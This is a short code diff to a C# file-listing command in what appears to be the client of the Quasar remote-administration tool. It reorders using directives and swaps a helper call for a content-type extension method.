@@ -1,13 +1,13 @@
-﻿using System;
-using System.IO;
-using System.Security;
-using System.Threading;
-using Quasar.Client.Helper;
-using Quasar.Client.Utilities;
+﻿using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
+using Quasar.Common.Extensions;
 using Quasar.Common.IO;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
+using System;
+using System.IO;
+using System.Security;
+using System.Threading;
 
 namespace Quasar.Client.Commands
 {
@@ -49,7 +49,7 @@ namespace Quasar.Client.Commands
                     items[i + offset] = new FileSystemEntry
                     {
                         EntryType = FileType.File, Name = files[i].Name, Size = files[i].Length,
-                        ContentType = FileHelper.GetContentType(Path.GetExtension(files[i].Name)),
+                        ContentType = Path.GetExtension(files[i].Name).ToContentType(),
                         LastAccessTimeUtc = files[i].LastAccessTimeUtc
                     };
                 }
